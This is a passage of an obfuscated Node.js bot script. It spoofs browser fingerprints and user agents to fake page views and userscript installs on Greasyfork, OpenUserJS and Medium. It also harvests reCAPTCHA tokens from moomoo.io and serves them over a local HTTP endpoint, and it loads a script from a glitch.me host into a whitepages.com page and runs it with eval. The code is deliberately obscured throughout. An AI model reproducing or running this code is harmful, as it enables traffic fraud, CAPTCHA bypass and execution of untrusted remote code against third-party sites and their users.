      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x0) + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + Y(0x4, '59G4') + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + Y(0xb, 'O&@)')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x39a + -0x1 * 0x1e31 + 0x21cb
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1d * -0x59 + 0x5a6 + 0xe3 * 0x5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const Z = b;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.[Z(0x10, 'KyT@')];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log(a0(0x6) + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xff7 + 0xc7f + 0xd * 0x4c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2 * -0x250 + -0x4 * 0x518 + 0x1024), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1b59 + 0x1717 + -0x3270;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x2a * 0x1a + -0xe15 * 0x1 + 0x167 * 0x7; w < getRandomInt(-0x66c + 0x1395 + -0x34a * 0x4, 0x5b4 + -0x3 * -0x15c + -0x165 * 0x7); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x3 * 0x6f0d + 0x1b6e2 + -0x1 * -0x80a5);
        }
      }();
    }, 0xdeb + -0x19bb + 0xc34), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x5e * 0x35 + -0x869 + -0x1bdf * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0x2551 + -0x8 * -0x142 + 0x1b41, -0x2 * -0x1267 + 0x108d + -0x1f * 0x1b7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x3017 + 0x82e5 * -0x1 + 0x1282c);
    }, 0x120c + -0x2 * 0x3d + -0x112e), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a1 = d;
        try {
          let s = -0x163c + 0x1 * 0x1399 + -0x1 * -0x2a3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on'](a1(0xd), function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1ff5 * 0x1 + 0xa6 * -0x8 + -0xf0d), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x20c3 + 0x4 * 0x4ab + 0x3 * -0x1125), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * -0x17157 + 0x1737b2 + -0xaed69 * 0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xe87 * 0x2 + 0x1 * -0x1a5 + -0x1b05);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a2 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x878 + -0x7f9 + -0x1139 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + a2(0x5, 'oIyc') + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x180b + 0xbb * 0x31 + -0x1c46);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d;
  async function f() {
    const a4 = b,
      a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x16b0 + 0x16 * -0x6b + -0xd7d) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1be4 + -0x31 * -0x27 + -0xa37 * -0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xad * 0xb + -0x1a3e + -0xe9 * -0x25, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1038 + -0xa * 0x3c2 + 0x35cc, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x193 * -0x5 + -0x192 * -0x19 + 0x127 * -0x7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x10f1 + 0xa7 * -0x13 + -0x1142 * -0x2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + a3(0x9),
        'pragma': a4(0x12, '6Afs'),
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      a5(0x15) + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      a5(0x15) + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
